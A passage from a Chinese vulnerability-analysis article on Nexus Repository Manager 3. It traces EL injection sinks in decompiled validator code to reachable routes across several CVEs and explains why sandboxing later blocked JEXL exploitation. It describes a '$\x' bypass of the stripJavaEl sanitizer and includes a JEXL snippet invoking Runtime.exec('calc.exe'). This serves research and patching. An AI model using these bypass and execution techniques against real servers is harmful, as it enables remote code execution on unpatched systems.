set.&#34;).addPropertyNode(&#34;username&#34;).addConstraintViolation();\n   38           }\n   39  \n   40           if (StringUtils.isBlank(password)) {\n   41:             context.buildConstraintViolationWithTemplate(&#34;User Authentication method requires the password to be set.&#34;).addPropertyNode(&#34;password&#34;).addConstraintViolation();\n   42           }\n   43  \n   ..\n   52           }\n   53  \n   54:          context.buildConstraintViolationWithTemplate(&#34;To proceed with PKI Authentication, clear the username and password fields. Otherwise, please select User Authentication.&#34;).addPropertyNode(&#34;authenticationType&#34;).addConstraintViolation();\n   55           return false;\n   56        default:\n   57:          context.buildConstraintViolationWithTemplate(&#34;unsupported authentication type &#34; + authenticationType).addConstraintViolation();\n   58           return false;\n   59        }\n\n\n\n\nF:\\compare-file\\nexus-3.21.2-03-win64\\nexus-3.21.2-03\\system\\org\\hibernate\\validator\\hibernate-validator\\6.1.0.Final\\hibernate-validator-6.1.0.Final\\org\\hibernate\\validator\\internal\\constraintvalidators\\hv\\ScriptAssertValidator.java:\n34        if (!validationResult &#38;amp;&#38;amp; !this.reportOn.isEmpty()) {\n35           constraintValidatorContext.disableDefaultConstraintViolation();\n36:          constraintValidatorContext.buildConstraintViolationWithTemplate(this.message).addPropertyNode(this.reportOn).addConstraintViolation();\n37        }\n38  \n\n\n\n\nF:\\compare-file\\nexus-3.21.2-03-win64\\nexus-3.21.2-03\\system\\org\\hibernate\\validator\\hibernate-validator\\6.1.0.Final\\hibernate-validator-6.1.0.Final\\org\\hibernate\\validator\\internal\\engine\\constraintvalidation\\ConstraintValidatorContextImpl.java:\n   55     }\n   56  \n   57:    public ConstraintViolationBuilder buildConstraintViolationWithTemplate(String messageTemplate) {\n   58        return new ConstraintValidatorContextImpl.ConstraintViolationBuilderImpl(messageTemplate, this.getCopyOfBasePath());\n   59     }\n\n\n\n\nF:\\compare-file\\nexus-3.21.2-03-win64\\nexus-3.21.2-03\\system\\org\\sonatype\\nexus\\nexus-cleanup\\3.21.0-02\\nexus-cleanup-3.21.0-02\\org\\sonatype\\nexus\\cleanup\\storage\\config\\CleanupPolicyAssetNamePatternValidator.java:\n18           } catch (RegexCriteriaValidator.InvalidExpressionException var4) {\n19              context.disableDefaultConstraintViolation();\n20:             context.buildConstraintViolationWithTemplate(var4.getMessage()).addConstraintViolation();\n21              return false;\n22           }\n\n\n\n\nF:\\compare-file\\nexus-3.21.2-03-win64\\nexus-3.21.2-03\\system\\org\\sonatype\\nexus\\nexus-cleanup\\3.21.2-03\\nexus-cleanup-3.21.2-03\\org\\sonatype\\nexus\\cleanup\\storage\\config\\CleanupPolicyAssetNamePatternValidator.java:\n   18           } catch (RegexCriteriaValidator.InvalidExpressionException var4) {\n   19              context.disableDefaultConstraintViolation();\n   20:             context.buildConstraintViolationWithTemplate(this.getEscapeHelper().stripJavaEl(var4.getMessage())).addConstraintViolation();\n   21              return false;\n   22           }\n\n\n\n\nF:\\compare-file\\nexus-3.21.2-03-win64\\nexus-3.21.2-03\\system\\org\\sonatype\\nexus\\nexus-scheduling\\3.21.2-03\\nexus-scheduling-3.21.2-03\\org\\sonatype\\nexus\\scheduling\\constraints\\CronExpressionValidator.java:\n   29        } catch (IllegalArgumentException var4) {\n   30           context.disableDefaultConstraintViolation();\n   31:          context.buildConstraintViolationWithTemplate(this.getEscapeHelper().stripJavaEl(var4.getMessage())).addConstraintViolation();\n   32           return false;\n   33        }\n\n\n\n\nF:\\compare-file\\nexus-3.21.2-03-win64\\nexus-3.21.2-03\\system\\org\\sonatype\\nexus\\nexus-security\\3.21.2-03\\nexus-security-3.21.2-03\\org\\sonatype\\nexus\\security\\privilege\\PrivilegesExistValidator.java:\n   42           if (!privilegeId.matches(&#34;^[a-zA-Z0-9\\\\-]{1}[a-zA-Z0-9_\\\\-\\\\.]*$&#34;)) {\n   43              context.disableDefaultConstraintViolation();\n   44:             context.buildConstraintViolationWithTemplate(&#34;Invalid privilege id: &#34; + this.getEscapeHelper().stripJavaEl(privilegeId) + &#34;. &#34; + &#34;Only letters, digits, underscores(_), hyphens(-), and dots(.) are allowed and may not start with underscore or dot.&#34;).addConstraintViolation();\n   45              return false;\n   46           }\n   ..\n   55        } else {\n   56           context.disableDefaultConstraintViolation();\n   57:          context.buildConstraintViolationWithTemplate(&#34;Missing privileges: &#34; + missing).addConstraintViolation();\n   58           return false;\n   59        }\n\n\n\n\nF:\\compare-file\\nexus-3.21.2-03-win64\\nexus-3.21.2-03\\system\\org\\sonatype\\nexus\\nexus-security\\3.21.2-03\\nexus-security-3.21.2-03\\org\\sonatype\\nexus\\security\\role\\RoleNotContainSelfValidator.java:\n   49              if (this.containsRole(id, roleId, processedRoleIds)) {\n   50                 context.disableDefaultConstraintViolation();\n   51:                context.buildConstraintViolationWithTemplate(this.message).addConstraintViolation();\n   52                 return false;\n   53              }\n\n\n\n\nF:\\compare-file\\nexus-3.21.2-03-win64\\nexus-3.21.2-03\\system\\org\\sonatype\\nexus\\nexus-security\\3.21.2-03\\nexus-security-3.21.2-03\\org\\sonatype\\nexus\\security\\role\\RolesExistValidator.java:\n   42        } else {\n   43           context.disableDefaultConstraintViolation();\n   44:          context.buildConstraintViolationWithTemplate(&#34;Missing roles: &#34; + missing).addConstraintViolation();\n   45           return false;\n   46        }\n\n\n\n\nF:\\compare-file\\nexus-3.21.2-03-win64\\nexus-3.21.2-03\\system\\org\\sonatype\\nexus\\nexus-validation\\3.21.2-03\\nexus-validation-3.21.2-03\\org\\sonatype\\nexus\\validation\\ConstraintViolationFactory.java:\n   75        public boolean isValid(ConstraintViolationFactory.HelperBean bean, ConstraintValidatorContext context) {\n   76           context.disableDefaultConstraintViolation();\n   77:          ConstraintViolationBuilder builder = context.buildConstraintViolationWithTemplate(this.getEscapeHelper().stripJavaEl(bean.getMessage()));\n   78           NodeBuilderCustomizableContext nodeBuilder = null;\n   79           String[] var8;</pre>\n\n\n\n<p>后面作者也发布了<a href=\"https://github.com/Cryin/Paper/blob/master/CVE-2018-16621%20Nexus%20Repository%20Manager3%20%E4%BB%BB%E6%84%8FEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5.md\">漏洞分析</a>，确实用了<code>buildConstraintViolationWithTemplate</code>作为了漏洞的根源，利用这个关键点做的污点跟踪分析。</p>\n\n\n\n<p>从上面的搜索结果中可以看到，el表达式导致的那三个CVE关键点也在其中，同时还有其他几个地方，有几个使用了<code>this.getEscapeHelper().stripJavaEl</code>做了清除，还有几个，看起来似乎也可以，心里一阵狂喜？然而，其他几个没有做清除的地方虽然能通过路由进入，但是利用不了，后面会挑选其中的一个做下分析。所以在开始说了官方可能修复了几个类似的地方，猜想有两种可能：</p>\n\n\n\n<ul><li>官方自己察觉到了那几个地方也会存在el解析漏洞，所以做了清除</li><li>有其他漏洞发现者提交了那几个做了清除的漏洞点，因为那几个地方可以利用；但是没清除的那几个地方由于没法利用，所以发现者并没有提交，官方也没有去做清除</li></ul>\n\n\n\n<p>不过感觉后一种可能性更大，毕竟官方不太可能有的地方做清除，有的地方不做清除，要做也是一起做清除工作。</p>\n\n\n\n<h5 id=\"cve-2018-16621\">CVE-2018-16621分析</h5>\n\n\n\n<p>这个漏洞对应上面的搜索结果是RolesExistValidator，既然搜索到了关键点，自己来手动逆向回溯下看能不能回溯到有路由处理的地方，这里用简单的搜索回溯下。</p>\n\n\n\n<p>关键点在<code>RolesExistValidator的isValid</code>，调用了<code>buildConstraintViolationWithTemplate</code>。搜索下有没有调用<code>RolesExistValidator</code>的地方：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/74082c2a-399d-4068-af46-784ea9bbf9ad.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在RolesExist中有调用，这种写法一般会把RolesExist当作注解来使用，并且进行校验时会调用<code>RolesExistValidator.isValid()</code>。继续搜索RolesExist：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/a8abc00f-847f-4f19-bfef-90797f84c145.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>有好几处直接使用了RolesExist对roles属性进行注解，可以一个一个去回溯，不过按照Role这个关键字RoleXO可能性更大，所以先看这个（UserXO也可以的），继续搜索RoleXO：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/a03dc11e-9383-4b38-8a3f-deb62c8020e9.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>会有很多其他干扰的，比如第一个红色标注<code>RoleXOResponse</code>，这种可以忽略，我们找直接使用<code>RoleXO的</code>地方。在<code>RoleComponent</code>中，看到第二个红色标注这种注解大概就知道，这里能进入路由了。第三个红色标注使用了roleXO，并且有roles关键字，上面RolesExist也是对roles进行注解的，所以这里猜测是对roleXO进行属性注入。有的地方反编译出来的代码不好理解，可以结合源码看：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/46c064b5-47c1-48af-9e30-7e6f50b9934a.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>可以看到这里就是将提交的参数注入给了roleXO，RoleComponent对应的路由如下：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/c7593a51-66ec-411a-881d-225c576dece6.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>通过上面的分析，我们大概知道了能进入到最终的<code>RolesExistValidator</code>，不过中间可能还有很多条件需要满足，需要构造payload然后一步一步测。这个路由对应的web页面位置如下：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/ae6b987e-e69f-49d8-84b9-42deb20acbb0.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>测试（这里使用的3.21.1版本，CVE-2018-16621是之前的漏洞，在3.21.1早修复了，不过3.21.1又被绕过了，所以下面使用的是绕过的情况，将<code>$</code>换成<code>$\\\\x</code>去绕过，绕过在后面两个CVE再说）：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/733df2f7-8b9c-490e-b8f9-85f311e08ce0.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>修复方式：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/24bb2b81-40e0-4943-9051-e6df9cda48da.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>加上了<code>getEscapeHelper().stripJavaEL</code>对el表达式做了清除，将<code>${</code>替换为了<code>{</code>，之后的两个CVE就是对这个修复方式的绕过：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/3a2a202a-c487-4629-b6c7-b3f3625ae622.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h5 id=\"cve-2020-10204\">CVE-2020-10204分析</h5>\n\n\n\n<p>这就是上面说到的对之前<code>stripJavaEL</code>修复的绕过，这里就不细分析了，利用<code>$\\\\x</code>格式就不会被替换掉（使用3.21.1版本测试）：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/334ef60b-16ef-47e6-9a54-3bddca441d45.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h5 id=\"cve-2020-10199\">CVE-2020-10199分析</h5>\n\n\n\n<p>这个漏洞对应上面搜索结果是<code>ConstraintViolationFactory</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/a91772db-d9f9-4e6d-b9e2-39b3ec1d6c23.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p><code>buildConstraintViolationWith</code>（标号1）出现在了<code>HelperValidator</code>（标号2）的<code>isValid</code>中，<code>HelperValidator</code>又被注解在<code>HelperAnnotation</code>（标号3、4）之上，<code>HelperAnnotation</code>注解在了<code>HelperBean</code>（标号5）之上，在<code>ConstraintViolationFactory.createViolation</code>方法中使用到了<code>HelperBean</code>（标号6、7）。按照这个思路要找调用了<code>ConstraintViolationFactory.createViolation</code>的地方。</p>\n\n\n\n<p>也来手动逆向回溯下看能不能回溯到有路由处理的地方。</p>\n\n\n\n<p>搜索ConstraintViolationFactory：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/28f2fcd3-3da6-4165-b65f-a1ce00fc4dab.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>有好几个，这里使用第一个<code>BowerGroupRepositoriesApiResource</code>分析，点进去看就能看出它是一个API路由：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/b3b938da-b060-4ecb-9380-bc08fe051072.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p><code>ConstraintViolationFactory</code>被传递给了<code>super</code>，在<code>BowerGroupRepositoriesApiResource</code>并没有调用<code>ConstraintViolationFactory</code>的其他函数，不过它的两个方法，也是调用了<code>super</code>对应的方法。它的<code>super</code>是<code>AbstractGroupRepositoriesApiResource</code>类：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/723592aa-a48e-42a7-bcad-7399760a1f69.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p><code>BowerGroupRepositoriesApiResource</code>构造函数中调用的<code>super</code>，在<code>AbstractGroupRepositoriesApiResourc</code>e赋值了<code>ConstraintViolationFactory</code>（标号1），<code>ConstraintViolationFactory</code>的使用（标号2），调用了<code>createViolation</code>（在后面可以看到memberNames参数），这也是之前要到达漏洞点所需要的，这个调用处于<code>validateGroupMembers</code>中（标号3），<code>validateGroupMembers</code>的调用在<code>createRepository</code>（标号4）和<code>updateRepository</code>（标号5）中都进行了调用，而这两个方法通过上面的注解也可以看出，通过外部传递请求能到达。</p>\n\n\n\n<p><code>BowerGroupRepositoriesApiResource</code>的路由为<code>/beta/repositories/bower/group</code>，在后台API找到它来进行调用（使用3.21.1测试）：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/724dc378-db5b-4ad2-907d-4c85b9ea2975.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>还有<code>AbstractGroupRepositoriesApiResource</code>的其他几个子类也是可以的：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/ef4d0811-2175-4d75-a350-97929f27c97e.png-w331s\" alt=\"\" /></figure>\n\n\n\n<h5 id=\"cleanuppolicyassetnamepatternvalidator\">CleanupPolicyAssetNamePatternValidator未做清除点分析</h5>\n\n\n\n<p>对应上面搜索结果的<code>CleanupPolicyAssetNamePatternValidator</code>，可以看到这里并没有做<code>StripEL</code>清除操作：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/4cd60e6d-b6a8-4ccf-861b-8a13b5bd39a8.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>这个变量是通过报错抛出放到<code>buildConstraintViolationWithTemplate</code>中的，要是报错信息中包含了value值，那么这里就是可以利用的。</p>\n\n\n\n<p>搜索<code>CleanupPolicyAssetNamePatternValidator</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/361cff8d-d17a-4bee-a856-e2fbabc815f4.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在<code>CleanupPolicyAssetNamePattern</code>类注解中使用了，继续搜索<code>CleanupPolicyAssetNamePattern</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/59b642e4-4f61-475b-bb8e-d207923bcc2c.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在<code>CleanupPolicyCriteri</code>a中的属性<code>regex</code>被<code>CleanupPolicyAssetNamePattern</code>注解了，继续搜索<code>CleanupPolicyCriteria</code>：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/8d188a37-91b5-4d94-b321-90c1e91c219d.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/83109995-979e-4d21-bc50-99267b1f4252.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>在<code>CleanupPolicyComponent</code>中的<code>to CleanupPolicy</code>方法中有调用，其中的<code>cleanupPolicyXO.getCriteria</code>也正好是<code>CleanupPolicyCriteria</code>对象。<code>toCleanupPolic</code>y在<code>CleanupPolicyComponent</code>的可通过路由进入的<code>create、previewCleanup</code>方法又调用了<code>toCleanupPolicy</code>。</p>\n\n\n\n<p>构造payload测试：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/13c283ce-5e72-44aa-a87d-52d0e0aafb6c.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/09/1586397401000-32.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>然而这里并不能利用，value值不会被包含在报错信息中，去看了下<code>RegexCriteriaValidator.validate</code>，无论如何构造，最终也只会抛出value中的一个字符，所以这里并不能利用。</p>\n\n\n\n<p>与这个类似的是<code>CronExpressionValidator</code>，那里也是通过抛出异常，但是那里是可以利用的，不过被修复了，可能之前已经有人提交过了。还有其他几个没做清除的地方，要么被if、else跳过了，要么不能利用。</p>\n\n\n\n<p>人工去回溯查找的方式，如果关键字被调用的地方不多可能还好，不过要是被大量使用，可能就不是那么好处理了。不过上面几个漏洞，可以看到通过手动回溯查找还是可行的。</p>\n\n\n\n<h4 id=\"jxelcve-2019-7238\">JXEL造成的漏洞（CVE-2019-7238）</h4>\n\n\n\n<p>可以参考下@iswin大佬之前的分析<a href=\"https://www.anquanke.com/post/id/171116\">https://www.anquanke.com/post/id/171116</a>，这里就不再去调试截图了。这里想写下之前对这个漏洞的修复，说是加了权限来修复，要是只加了权限，那不是还能提交一下？不过，测试了下3.21.1版本，就算用admin权限也无法利用了，想去看下是不是能绕过。在3.14.0中测试，确实是可以的：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/b5ff36d8-ef98-4f73-a697-a416e91f5323.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>但是3.21.1中，就算加了权限，也是不行的。后面分别调试对比了下，以及通过下面这个测试：</p>\n\n\n\n<pre class=\"crayon-plain-tag\">JexlEngine jexl = new JexlBuilder().create();\n\nString jexlExp = &#34;''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')&#34;;\nJexlExpression e = jexl.createExpression(jexlExp);\nJexlContext jc = new MapContext();\njc.set(&#34;foo&#34;, &#34;aaa&#34;);\n\ne.evaluate(jc);</pre>\n\n\n\n<p>才知道3.14.0与上面这个测试使用的是<code>org.apache.commons.jexl3.internal.introspection.Uberspect</code>处理，它的getMethod方法如下：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/9002e2e8-b2f6-49dc-8121-d08302ab8e34.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>而在3.21.1中Nexus设置的是<code>org.apache.commons.jexl3.internal.introspection.SandboxJexlUberspect</code>，这个<code>SandboxJexlUberspect</code>，它的get Method方法如下：</p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/325d13a1-1e91-4a39-a883-d3bdd3395543.png-w331s\" alt=\"\" /></figure>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2020/04/56d63d18-aa30-4fbf-93eb-c6bc79bca824.png-w331s\" alt=\"\" /></figure>\n\n\n\n<p>可以看出只允许调用String、Map、Collection类型的有限几个方法了。</p>\n\n\n\n<h4 id=\"_4\">总结</h4>\n\n\n\n<ul><li>看完上面的内容，相信对Nexus3的漏洞大体有了解了，不会再无从下手的感觉。尝试看下下其他地方，例如后台有个LDAP，可进行jndi connect操作，不过那里调用的是<code>context.getAttribute</code>，虽然会远程请求class文件，不过并不会加载class，所以并没有危害。</li><li>有的漏洞的根源点可能会在一个应用中出现相似的地方，就像上面那个<code>buildConstraintViolationWithTemplate</code>这个keyword一样，运气好说不定一个简单的搜索都能碰到一些相似漏洞（不过我运气貌似差了点，通过上面的搜索可以看到某些地方的修复，说明已经有人先行一步了，直接调用了<code>buildConstraintViolationWithTemplate</code>并且可用的地方似乎已经没有了）</li><li>仔细看下上面几个漏洞的payload，好像相似度很高，所以可以弄个类似fuzz参数的工具，搜集这个应用的历史漏洞payload，每个参数都可以测试下对应的payload，运气好可能会撞到一些相似漏洞</li></ul>\n\n\n\n<hr class=\"wp-block-separator\" />\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg\" alt=\"Paper\" /></figure>\n\n\n\n<p>本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href=\"https://paper.seebug.org/1166/\">https://paper.seebug.org/1166/</a><br></p>\n","descriptionType":"html","publishedDate":"Fri, 31 Jul 2020 03:33:54 +0000","feedId":2536,"bgimg":"https://images.seebug.org/content/images/2020/04/54f81ba1-d814-4f39-8752-31c50ceab3e8.png-w331s","linkMd5":"76d99b92fc03ec11de8661e415c762e4","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn61@2020_2/2020/08/24/21-14-51-086_4fb84f186bb65ce4.webp","destWidth":1887,"destHeight":875,"sourceBytes":310229,"destBytes":145994,"author":"叶霖 杨","articleImgCdnMap":{"https://images.seebug.org/content/images/2020/04/54f81ba1-d814-4f39-8752-31c50ceab3e8.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn61@2020_2/2020/08/24/21-14-51-086_4fb84f186bb65ce4.webp","https://images.seebug.org/content/images/2020/04/ee24d6df-cd81-4a21-9e66-bef5a87f5c02.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn4@2020_5/2020/08/24/21-14-54-678_75fe4e33b2a34715.webp","https://images.seebug.org/content/images/2020/04/68c35d66-7d4a-4c1f-9bb8-cf95d6886d8c.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn26@2020_3/2020/08/24/21-14-52-768_4ea56f4e6d7f3fc7.webp","https://images.seebug.org/content/images/2020/04/ffe5ae14-c22a-40e9-8747-3cd2e961b5f3.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn57@2020_4/2020/08/24/21-14-54-297_95a8d09e94e6ec65.webp","https://images.seebug.org/content/images/2020/04/126eb9bf-e825-4a1e-953b-5cb16423f711.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn6@2020_5/2020/08/24/21-14-53-841_60c2492acf909366.webp","https://images.seebug.org/content/images/2020/04/f351fbe2-e26f-4b1b-902b-5dc0af2d59cc.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn33@2020_6/2020/08/24/21-14-56-891_e64ff545f4b890ec.webp","https://images.seebug.org/content/images/2020/04/5dae87a4-ad25-4680-b86b-cafc19562f3e.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn55@2020_1/2020/08/24/21-15-01-059_cd158a53a70d3880.webp","https://images.seebug.org/content/images/2020/04/c80672ed-1c47-439f-b0f7-fea62692384a.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn87@2020_2/2020/08/24/21-14-58-444_7a86c937b03091fa.webp","https://images.seebug.org/content/images/2020/04/76977519-5dc6-48ea-945d-cb3effed6504.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn21@2020_2/2020/08/24/21-14-55-484_0c3e979551b97b3b.webp","https://images.seebug.org/content/images/2020/04/6a07cab3-67ca-4c9c-aa31-5ce6b3f927bc.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn94@2020_2/2020/08/24/21-14-57-040_570a755efeb4ab82.webp","https://images.seebug.org/content/images/2020/04/74082c2a-399d-4068-af46-784ea9bbf9ad.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx/cdn47@2020_1/2020/08/24/21-15-00-044_89d82652e66022fb.webp","https://images.seebug.org/content/images/2020/04/a8abc00f-847f-4f19-bfef-90797f84c145.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn7@2020_5/2020/08/24/21-14-58-370_9aa67896196dcf04.webp","https://images.seebug.org/content/images/2020/04/a03dc11e-9383-4b38-8a3f-deb62c8020e9.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn85@2020_2/2020/08/24/21-14-54-342_f8ee337dc8113013.webp","https://images.seebug.org/content/images/2020/04/46c064b5-47c1-48af-9e30-7e6f50b9934a.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn2@2020_2/2020/08/24/21-14-53-803_300a398dc12e2e24.webp","https://images.seebug.org/content/images/2020/04/c7593a51-66ec-411a-881d-225c576dece6.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn56@2020_1/2020/08/24/21-14-53-792_378b11ab7f45e40d.webp","https://images.seebug.org/content/images/2020/04/ae6b987e-e69f-49d8-84b9-42deb20acbb0.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn34@2020_1/2020/08/24/21-14-55-446_c126c6200197bd91.webp","https://images.seebug.org/content/images/2020/04/733df2f7-8b9c-490e-b8f9-85f311e08ce0.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn58@2020_6/2020/08/24/21-14-57-753_a292a8c8813b3b62.webp","https://images.seebug.org/content/images/2020/04/24bb2b81-40e0-4943-9051-e6df9cda48da.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx/cdn21@2020_3/2020/08/24/21-14-57-383_f443a2d4345597d1.webp","https://images.seebug.org/content/images/2020/04/3a2a202a-c487-4629-b6c7-b3f3625ae622.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn47@2020_2/2020/08/24/21-14-59-883_f91507e04c599c00.webp","https://images.seebug.org/content/images/2020/04/334ef60b-16ef-47e6-9a54-3bddca441d45.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn71@2020_6/2020/08/24/21-15-01-356_64ccf23891cf0865.webp","https://images.seebug.org/content/images/2020/04/a91772db-d9f9-4e6d-b9e2-39b3ec1d6c23.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn73@2020_5/2020/08/24/21-14-55-762_d068f4c214f413a7.webp","https://images.seebug.org/content/images/2020/04/28f2fcd3-3da6-4165-b65f-a1ce00fc4dab.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx/cdn89@2020_1/2020/08/24/21-14-53-071_3ac08b7fbdbbd4e8.webp","https://images.seebug.org/content/images/2020/04/b3b938da-b060-4ecb-9380-bc08fe051072.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn14@2020_1/2020/08/24/21-14-55-163_c48d0312bba3b725.webp","https://images.seebug.org/content/images/2020/04/723592aa-a48e-42a7-bcad-7399760a1f69.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn46@2020_6/2020/08/24/21-14-54-185_a8e079cff83edab7.webp","https://images.seebug.org/content/images/2020/04/724dc378-db5b-4ad2-907d-4c85b9ea2975.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn19@2020_5/2020/08/24/21-14-59-968_f9febdaa31feed1b.webp","https://images.seebug.org/content/images/2020/04/ef4d0811-2175-4d75-a350-97929f27c97e.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn59@2020_1/2020/08/24/21-15-00-161_66b0187e497514bb.webp","https://images.seebug.org/content/images/2020/04/4cd60e6d-b6a8-4ccf-861b-8a13b5bd39a8.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn34@2020_6/2020/08/24/21-14-53-857_cd7de36e0a929fc0.webp","https://images.seebug.org/content/images/2020/04/361cff8d-d17a-4bee-a856-e2fbabc815f4.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn72@2020_2/2020/08/24/21-14-59-703_2424f8beb350055d.webp","https://images.seebug.org/content/images/2020/04/59b642e4-4f61-475b-bb8e-d207923bcc2c.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn76@2020_5/2020/08/24/21-14-57-931_e05dd2fe7c8210a2.webp","https://images.seebug.org/content/images/2020/04/8d188a37-91b5-4d94-b321-90c1e91c219d.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn92@2020_4/2020/08/24/21-14-59-113_814dbbaad51d4f66.webp","https://images.seebug.org/content/images/2020/04/83109995-979e-4d21-bc50-99267b1f4252.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn73@2020_6/2020/08/24/21-14-54-834_d12e3353783a8e4f.webp","https://images.seebug.org/content/images/2020/04/13c283ce-5e72-44aa-a87d-52d0e0aafb6c.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn38@2020_2/2020/08/24/21-14-55-512_c765a505dc90124a.webp","https://images.seebug.org/content/images/2020/04/09/1586397401000-32.png-w331s":null,"https://images.seebug.org/content/images/2020/04/b5ff36d8-ef98-4f73-a697-a416e91f5323.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn22@2020_2/2020/08/24/21-14-52-494_0a7ad65fb1ae1030.webp","https://images.seebug.org/content/images/2020/04/9002e2e8-b2f6-49dc-8121-d08302ab8e34.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn16@2020_2/2020/08/24/21-14-53-741_173397dbd91c9f65.webp","https://images.seebug.org/content/images/2020/04/325d13a1-1e91-4a39-a883-d3bdd3395543.png-w331s":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn73@2020_6/2020/08/24/21-14-57-182_6326c1438a984f18.webp",